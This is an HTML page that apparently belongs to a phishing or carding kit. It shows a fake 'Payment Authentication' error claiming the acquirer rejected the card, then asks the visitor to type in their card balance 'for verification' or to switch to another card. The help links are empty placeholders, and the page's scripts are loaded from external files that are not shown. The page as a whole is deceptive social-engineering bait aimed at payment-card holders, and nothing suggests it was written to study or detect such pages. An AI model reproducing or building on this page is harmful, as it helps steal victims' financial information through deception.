<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Card</title>
    <link rel="stylesheet" href="../css/fonts.css">
    <link rel="stylesheet" href="../css/style.css">
</head>
<body>
    <div id="loading-bar-spinner">
        <div class="spinner-icon"></div>
    </div>
    <div id="loader-background"></div>
    <main>
        <div class="card error">
            <div class="card__images">
                <img src="../img/error1.png" alt="card">
                <img class="changeImg" src="../img/error2.png" alt="card">
            </div>
            <h1 class="title">Payment Authentication</h1>
            <p class="error__text">
                <span>ERROR 500:</span>
                Acquiring has rejected this payment method for this merchant, <br>
                contact support or try again later in one hour.
            </p>
            <form>
                <label>
                    Enter Balance of your card for verification in the payment system or change your bank card
                    <input class="verification" type="text" required placeholder="Verification Balance">
                </label>
                <button type="submit" class="button button-change">Continue</button>
                <button class="button button-white">Change Card</button>
            </form>



            <div class="links">
                <a href="#">Need some help?</a>
                <a href="#">learn more about authentication</a>
            </div>
        </div>
    </main>

    <script src="../js/loader.js"></script>
    <script src="../js/script.js"></script>
</body>
</html>
